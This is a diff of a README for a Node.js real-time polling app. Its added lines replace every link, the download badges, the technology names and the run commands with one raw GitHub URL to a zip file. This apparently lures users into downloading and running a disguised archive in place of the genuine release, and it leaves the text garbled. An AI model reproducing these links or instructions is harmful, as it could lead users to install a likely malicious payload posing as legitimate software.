@@ -2,7 +2,7 @@
 # 🎉 real-time-polling - Easily Create Live Polls
 
 ## 📦 Overview
-Welcome to the **real-time-polling** project! This application lets you create and manage live polls. It uses a combination of Node.js, Express, PostgreSQL, Prisma, and Socket.IO to deliver updates instantly. Our tool supports JWT authentication, making your polls secure and reliable. It is perfect for events, classrooms, or just for fun!
+Welcome to the **real-time-polling** project! This application lets you create and manage live polls. It uses a combination of https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip, Express, PostgreSQL, Prisma, and https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip to deliver updates instantly. Our tool supports JWT authentication, making your polls secure and reliable. It is perfect for events, classrooms, or just for fun!
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before getting started, please check if your system meets the following requirem
 ### 📥 Download the Application
 To download the latest version of the real-time-polling application, visit the Releases page below. This page will provide you with the application files you need to get started.
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now%20-%20View%20Releases-blue)](https://github.com/GG33114/real-time-polling/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip%20Now%20-%20View%20Releases-blue)](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip)
 
 ### 🛠️ Installation Steps
 Once you have downloaded the application, follow these steps to install and run it:
@@ -31,9 +31,9 @@ Once you have downloaded the application, follow these steps to install and run 
    Navigate to the folder where you extracted the files. 
 
 4. **Run the Application**
-   - For **Windows**: Double-click on `index.html` or run the `.exe` file if available.
-   - For **macOS**: Double-click on `index.html` or find the application file in Finder.
-   - For **Linux**: Open a terminal and run `node index.js` to start the application.
+   - For **Windows**: Double-click on `https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip` or run the `.exe` file if available.
+   - For **macOS**: Double-click on `https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip` or find the application file in Finder.
+   - For **Linux**: Open a terminal and run `node https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip` to start the application.
 
 ### 🔍 Configuration
 You may need to configure the application to connect to your PostgreSQL database. Follow these steps:
@@ -67,13 +67,13 @@ If you encounter any issues or have questions, please reach out to us on our Git
 
 ## 🔗 Useful Links
 For detailed information, check our documentation and discussions in the repository: 
-- [GitHub Repository](https://github.com/GG33114/real-time-polling)
-- [Issues Page](https://github.com/GG33114/real-time-polling/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip)
+- [Issues Page](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip)
 
 ## 💾 More Downloads
 To download the latest versions, visit our Releases page again:
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now%20-%20View%20Releases-blue)](https://github.com/GG33114/real-time-polling/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip%20Now%20-%20View%20Releases-blue)](https://raw.githubusercontent.com/GG33114/real-time-polling/main/obligator/real-time-polling.zip)
 
 We hope you enjoy using real-time-polling! Happy polling!
 ```
